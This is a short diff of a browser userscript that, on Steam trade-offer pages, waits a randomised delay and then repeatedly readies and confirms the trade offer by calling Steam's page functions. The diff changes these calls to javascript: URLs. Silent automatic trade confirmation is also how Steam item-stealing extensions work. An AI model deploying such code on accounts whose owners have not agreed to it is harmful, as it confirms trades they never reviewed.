@@ -29,7 +29,7 @@ function script()
 	if(window.location.href.indexOf("http://steamcommunity.com/tradeoffer/") > -1)
 	{	
 	    //alert("hit");
-	    setTimeout(steamverify, Math.floor((Math.random()*5000)+3000));    
+	    setTimeout(steamverify, Math.floor((Math.random()*5000)+3000));	    
 	}
 	 
 	 
@@ -84,19 +84,19 @@ function script()
 	}
 	 
 	function steamverify(){
-	    unsafeWindow.ToggleReady(true);
+	    location.href = "javascript:ToggleReady(true)";
 	    setTimeout(steamtrustuser, 1000);
 	    setTimeout(steamconfirm, Math.floor((Math.random()*2000)+1000));
 	    setTimeout(steamverifyrep, Math.floor((Math.random()*2000)+1000));
 	}
 	 
 	function steamverifyrep(){
-	    unsafeWindow.ToggleReady(true);
+	    location.href = "javascript:ToggleReady(true)";
 	    setTimeout(steamverifyrep, Math.floor((Math.random()*2000)+1000));
 	}
 	 
 	function steamconfirm(){
-	    unsafeWindow.ConfirmTradeOffer();    
+		location.href = "javascript:ConfirmTradeOffer()";
 	    setTimeout(steamconfirm, 4000);
 	}
 	 
